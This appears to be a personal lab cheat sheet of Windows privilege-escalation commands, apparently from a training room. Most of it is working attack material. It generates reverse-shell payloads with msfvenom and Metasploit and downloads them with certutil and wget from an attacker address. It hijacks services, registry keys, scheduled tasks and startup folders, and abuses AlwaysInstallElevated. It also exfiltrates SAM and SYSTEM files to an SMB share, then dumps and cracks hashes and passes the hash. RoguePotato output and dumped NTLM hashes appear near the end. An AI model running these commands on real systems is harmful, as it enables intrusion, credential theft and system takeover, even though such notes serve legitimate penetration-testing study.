# Commands

xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.18.19


msfvenom -p windows/x64/shell_reverse_tcp -o exe -f reverse.exe LHOST=10.18.112.115 LPORT=53

# using python web server
sudo python3 -m http.server 80
# go to the windows box
certutil -urlcache -f http://10.18.112.115/reverse.exe reverse.exe

# using python smb server
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .

# go to the windows box
copy \\10.18.112.115\kali\reverse.exe C:\PrivEsc\reverse.exe

# use the wget command from powershell
x86_64-w64-mingw32-gcc malicious_dll.c -shared -o output.dll
wget -O hijackme.dll ATTACKBOX_IP:PORT/hijackme.dll
xfreerdp /u:jack /p:Password11 /cert:ignore /v:10.10.12.172:3389


# using metasploit
msfconsole
search web_delivery
use exploit/multi/script/web_delivery
set target PSH Binary
set payload windows/powershell_reverse_tcp (stageless)
set LHOSTS <attacker-ip>
show advanced
set PSH-EncodedCommand false
exploit

# information gathering

## user enumeration

whoami /priv
# list users
net users
# list details of a user
net user username
# details about other users logged on the system
qwinsta
query session
# user groups defined on the system
net localgroup
# list members of a specific group
net localgroup groupname

## collecting system info
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

## searching for files using findstr
help findstr
findstr /si password *.txt
# /si - searches for current directory and sub-directories
# search for .txt, .xml, .config, .ini & .xls extensions

## patch levels
## wmic - windows management instrumentation command line interface
wmic qfe
wmic qfe | findstr /C:"K4562562"
wmic qfe get Caption,Description,HotFixID,InstalledOn
## About the products/installed software
wmic product
wmic product get name,version,vendor
wmic service list brief
wmic service list brief | findstr "Running"
wmic service get name,displayname,pathname,startmode
sc qc <service-name>

## WinPEAS
## run all checks (except for additional slower checks - LOLBAS and linpeas.sh in WSL) (noisy - CTFs)
winpeas.exe

## Only systeminfo and userinfo checks executed
winpeas.exe systeminfo userinfo

## Do not color the output
winpeas.exe notcolor

## enumerate also domain information
winpeas.exe domain

## wait for user input between tests
winpeas.exe wait

## display additional debug information
winpeas.exe debug

## log output to out.txt instead of standard output
winpeas.exe log

## Execute also additional linpeas check (runs linpeas.sh in default WSL distribution) with custom linpeas.sh URL (if not provided, the default URL is: https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh)
winpeas.exe -linpeas=http://127.0.0.1/linpeas.sh

## Execute also additional LOLBAS search check
winpeas.exe -lolbas

## gathering active listening ports and processess information
netstat -ano

## scheduled tasks
## some tasks may be scheduled to run at pre-defined times
schtasks /query /?
schtasks /query /fo LIST /v

## drivers
dirverquery

## anti-virus
sc query windefend
sc queryex type=service

## winPEAS & PowerUp
.\winpeas.exe
powershell.exe -nop -exec bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks
Get-UnquotedService
windows-exploit-suggester.py --update
windows-exploit-suggester.py --database 2021-09-21-mssb.xls --systeminfo sysinfo_output.txt

## To get a more advanced version of windows exploiter
https://github.com/bitsadmin/wesng

## with metasploit
use multi/recon/local_exploit_suggester

# service exploits - Insecure service permissions

.\Accesschk.exe /accepteula -uwcqv user daclsvc
# the following will list the users with read/write privileges
.\Accesschk.exe /accepteula -uwdq "C:\Program Files\"
sc qc daclsvc
sc config binpath="\"C:\PrivEsc\reverse_system.exe\""
net stop daclsvc
net start daclsvc


# To view a file in windows
more flagUSP.txt
dir /b/s flagUSP.txt


# AlwaysInstallElevated

## the following registry keys should be set
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi

msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi

## Saved credentials
cmdkey /list

# credentials with runas command
runas /savecred /user:admin reverse_shell.exe

## registry keys having passwords
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s


## Weak registry permissions
## Take a note of SERVICE_START_NAME (see if it is running as SYSTEM user)
sc qc regsvc
## See if the registry entry for this service is editable by "NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users)
.\Accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
## Overwrite image path registry key
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
net start regsvc



## Insecure Service Executables
sc qc filepermsvc (runs with SYSTEM)
## notice that filepermservice.exe file is writable by everyone
.\Accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
net start filepermsvc


## Auto-Run executables
## query the registry for auto-run executables
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
.\Accesschk.exe /accepteula -quvw "C:\Program Files\Autorun Program\program.exe"
## wait for admin to login


## Always Install Elevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
## If the keys are set to one, then generate an .msi payload using msfvenom
msfvenom -p windows\x64\shell_reverse_tcp LHOST=10.18.112.115 LPORT=4445 -f msi -o reverse.msi
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi



## Passwords Registry
## the registry can be queried for keys and values that contain the string "password"
reg query HKLM /f password /t REG_SZ /s
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
winexe -U 'admin%password123' //10.10.205.207 cmd.exe


## Save Credentials
cmdkey /list
runas /savecred /user:admin C:\PrivEsc\reverse.exe



## Security Account Manager
## the SAM & SYSTEM files can be used to extract password hashes
## if the target has these backup's somewhere, we can use it.
copy C:\Windows\Repair\SAM \\10.18.112.115\kali\
copy C:\Windows\Repair\SYSTEM \\10.18.112.115\kali\ 
## clone the following repo for dumping/cracking the hases
git clone https://github.com/Tib3rius/creddump7
pip3 install pycrypto
python3 creddump7/pwdump.py SYSTEM SAM
## Once you have obtained the hases, crack the NTLM hash
hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt


## Just pass the hash
pth-winexe -U 'admin%hash' //10.10.173.142 cmd.exe

## Scheduled Tasks
## View the contents of the C:\DevTools\CleanUp.ps1 script:
type C:\DevTools\CleanUp.ps1

## The script seems to be running as SYSTEM every minute. Using accesschk.exe, note that you have the ability to write to this file:
C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1

## Start a listener on Kali and then append a line to the C:\DevTools\CleanUp.ps1 which runs the reverse.exe executable you created:
echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1

## Insecure GUI Apps

## Start an RDP session as the "user" account:
rdesktop -u user -p password321 10.10.173.142
## Double-click the "AdminPaint" shortcut on your Desktop. Once it is running, open a command prompt and note that Paint is running with admin privileges:
tasklist /V | findstr mspaint.exe
## In Paint, click "File" and then "Open". In the open file dialog box, click in the navigation input and paste: file://c:/windows/system32/cmd.exe
## Press Enter to spawn a command prompt running with admin privileges.


## Startup Apps


## Using accesschk.exe, note that the BUILTIN\Users group can write files to the StartUp directory:
C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

## Using cscript, run the C:\PrivEsc\CreateShortcut.vbs script which should create a new shortcut to your reverse.exe executable in the StartUp directory:
cscript C:\PrivEsc\CreateShortcut.vbs

## Start a listener on Kali, and then simulate an admin logon using RDP and the credentials you previously extracted:
rdesktop -u admin 10.10.173.142


#➜  Downloads python3 creddump7/pwdump.py SYSTEM SAM
#Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
#Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
#DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
#WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6ebaa6d5e6e601996eefe4b6048834c2:::
#user:1000:aad3b435b51404eeaad3b435b51404ee:91ef1073f6ae95f5ea6ace91c09a963a:::
#admin:1001:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
#➜  Downloads 


## Token Impersonation - Rogue Potato

#Set up a socat redirector on Kali, forwarding Kali port 135 to port 9999 on Windows:
sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.173.142:9999

# Start a listener on Kali. Simulate getting a service account shell by logging into RDP as the admin user, starting an elevated command prompt (right-click -> run as administrator) and using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service" account:

C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe

# Start another listener on Kali.

#Now, in the "local service" reverse shell you triggered, run the RoguePotato exploit to trigger a second reverse shell running with SYSTEM privileges (update the IP address with your Kali IP accordingly):

C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 4444

C:\PrivEsc>.\RoguePotato.exe -r 10.10.173.142 -e "C:\PrivEsc\reverse.exe" -l 9999
.\RoguePotato.exe -r 10.10.173.142 -e "C:\PrivEsc\reverse.exe" -l 9999
[+] Starting RoguePotato...
[*] Creating Rogue OXID resolver thread
[*] Creating Pipe Server thread..
[*] Creating TriggerDCOM thread...
[*] Listening on pipe \\.\pipe\RoguePotato\pipe\epmapper, waiting for client to connect
[*] Calling CoGetInstanceFromIStorage with CLSID:{4991d34b-80a1-4291-83b6-3328366b9097}
[*] Starting RogueOxidResolver RPC Server listening on port 9999 ... 
[*] IStoragetrigger written:108 bytes
[-] Named pipe didn't received any connect request. Exiting ... 

C:\PrivEsc>.\RoguePotato.exe -r 10.18.112.115 -e "C:\PrivEsc\reverse.exe" -l 9999
.\RoguePotato.exe -r 10.18.112.115 -e "C:\PrivEsc\reverse.exe" -l 9999
[+] Starting RoguePotato...
[*] Creating Rogue OXID resolver thread
[*] Creating Pipe Server thread..
[*] Creating TriggerDCOM thread...
[*] Listening on pipe \\.\pipe\RoguePotato\pipe\epmapper, waiting for client to connect
[*] Calling CoGetInstanceFromIStorage with CLSID:{4991d34b-80a1-4291-83b6-3328366b9097}
[*] Starting RogueOxidResolver RPC Server listening on port 9999 ... 
[*] IStoragetrigger written:108 bytes
[*] SecurityCallback RPC call
[*] ServerAlive2 RPC Call
[*] SecurityCallback RPC call
[*] ResolveOxid2 RPC call, this is for us!
[*] ResolveOxid2: returned endpoint binding information = ncacn_np:localhost/pipe/RoguePotato[\pipe\epmapper]
[*] Client connected!
[+] Got SYSTEM Token!!!
[*] Token has SE_ASSIGN_PRIMARY_NAME, using CreateProcessAsUser() for launching: C:\PrivEsc\reverse.exe
[+] RoguePotato gave you the SYSTEM powerz :D

C:\PrivEsc>whoami
whoami
nt authority\local service

